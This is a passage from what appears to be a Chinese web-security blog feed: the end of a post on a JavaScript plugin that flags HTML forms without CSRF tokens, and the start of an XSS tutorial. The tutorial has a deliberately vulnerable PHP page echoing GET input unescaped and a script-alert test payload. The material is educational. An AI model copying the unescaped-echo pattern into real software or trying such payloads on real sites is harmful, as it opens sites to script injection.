class=&quot;number&quot;&gt;0&lt;/span&gt;;i &amp;lt; $(&lt;span class=&quot;string&quot;&gt;&quot;form&quot;&lt;/span&gt;).length;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; formDom = $(&lt;span class=&quot;string&quot;&gt;&quot;form&quot;&lt;/span&gt;).eq(i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imageFileSuffix = [&lt;span class=&quot;string&quot;&gt;&#39;.jpg&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.png&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.jpge&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.ico&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.gif&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;.bmp&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; placeholderFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;跳&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;搜&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;查&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;找&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;登陆&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;注册&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionFilterKeyword = [&lt;span class=&quot;string&quot;&gt;&#39;search&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;find&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;login&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;reg&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//去除类似搜索、页面跳转等无用的form表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;) != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; actionCheck = actionFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (formDom.attr(&lt;span class=&quot;string&quot;&gt;&quot;action&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(actionCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; x = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;x &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).length;x++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; inputTextCheck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; inputText =  formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).eq(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        inputTextCheck = placeholderFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputTextCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//去除没有提交按钮的form表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:submit&quot;&lt;/span&gt;).length &amp;lt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//去除具有token的form表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:hidden&quot;&lt;/span&gt;).length;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:hidden&quot;&lt;/span&gt;).eq(j).val().length &amp;gt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;//去除带有验证码的form表单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).length &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imageCheck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; z = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;z &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).length;z++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; img = formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).eq(z);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imgSrc = img.attr(&lt;span class=&quot;string&quot;&gt;&quot;src&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!!imgSrc)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    imgSrc = imgSrc.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;),imgSrc.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                imageCheck = imageFileSuffix.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (imgSrc == item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!imageCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(formDom)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里的console.log(formDom)可以改为ajax等方式发包，或者alert直接提醒此页面可能具有csrf漏洞。至于如何使用，需要大伙手工打包成浏览器插件的形式。而这里我为大家附上我之前写的自动化检测XSS的插件：&lt;a href=&quot;http://pan.baidu.com/s/1ge5VTcf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1ge5VTcf&lt;/a&gt;。大家可以直接解包，修改里面的JavaScript代码为上面完整的代码，再重新打包就行了。&lt;/p&gt;
&lt;p&gt;文章呢，还有很多地方不足。而这套程序还只能说是雏形，所以我没有附上直接利用的工具给大家，也是第一次这样。而且有很多地方没有考虑到，比如JSON Hijacking检测。当然下一章会完成的，也会放出可以直接利用的工具。第二章或者第三章可能会把之前写的XSS自动化检测与本章所说的自动化检测CSRF相结合起来。毕竟XSS+CSRF的危害是非常大的。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言：&quot;&gt;&lt;a href=&quot;#0x00-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言：&quot;&gt;&lt;/a&gt;0x00 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。&lt;br&gt;检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XSS的原理分析与解剖</title>
    <link href="http://bugs.cc/2016/05/30/XSS%E7%9A%84%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E5%89%96/"/>
    <id>http://bugs.cc/2016/05/30/XSS的原理分析与解剖/</id>
    <published>2016-05-30T03:27:07.000Z</published>
    <updated>2016-08-20T11:04:40.211Z</updated>
    
    <content type="html">&lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言&quot;&gt;&lt;a href=&quot;#0×01-前言&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言:&quot;&gt;&lt;/a&gt;0×01 前言:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。&lt;/p&gt;
&lt;p&gt;我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;耗时间&lt;/li&gt;
&lt;li&gt;有一定几率不成功&lt;/li&gt;
&lt;li&gt;没有相应的软件来完成自动化攻击&lt;/li&gt;
&lt;li&gt;前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底&lt;/li&gt;
&lt;li&gt;是一种被动的攻击手法&lt;/li&gt;
&lt;li&gt;对website有http-only、crossdomian.xml没有用&lt;/li&gt;
&lt;/ol&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个“XSS几乎每个网站都存在，google、baidu、360等都存在。”&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0x02-原理：&quot;&gt;&lt;a href=&quot;#0x02-原理：&quot; class=&quot;headerlink&quot; title=&quot;0x02 原理：&quot;&gt;&lt;/a&gt;0x02 原理：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码:&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;XSS原理重现&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;get&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;xss_input&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;hr&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $xss = $_GET[&#39;xss_input&#39;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        echo &#39;你输入的字符为&amp;lt;br&amp;gt;&#39;.$xss;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后，你会在页面看到这样的页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/iK1iNW.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们试着输入abcd123，得到的结果为&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/HheYf8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们在看看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/aSWspi.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;会出现什么呢？如果按照上面的例子来说，它应该存在第12行的&lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;与&lt;code&gt;&amp;lt;/boby&amp;gt;&lt;/code&gt;之间，变成&lt;code&gt;&amp;lt;br&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&amp;lt;/boby&amp;gt;&lt;/code&gt;，那应该会弹出对话框。&lt;/p&gt;
&lt;p&gt;既然假设提出来，那我们来实现下这个假设成不成立吧。&lt;/p&gt;
&lt;p&gt;我们输入&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;，得到的页面为&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/cdFv9V.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;成功弹窗，这个时候基本上就可以确定存在xss漏洞。&lt;/p&gt;
&lt;p&gt;我们在看看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/ImuxHT.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0×03-xss利用输出的环境来构造代码&quot;&gt;&lt;a href=&quot;#0×03-xss利用输出的环境来构造代码&quot; class=&quot;headerlink&quot; title=&quot;0×03 xss利用输出的环境来构造代码:&quot;&gt;&lt;/a&gt;0×03 xss利用输出的环境来构造代码:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;上节说了xss的原理，但是我们的输出点不一在&lt;code&gt;&amp;lt;br&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;/boby&amp;gt;&lt;/code&gt;里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;就会弹窗。&lt;/p&gt;
&lt;p&gt;先贴出代码:&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span 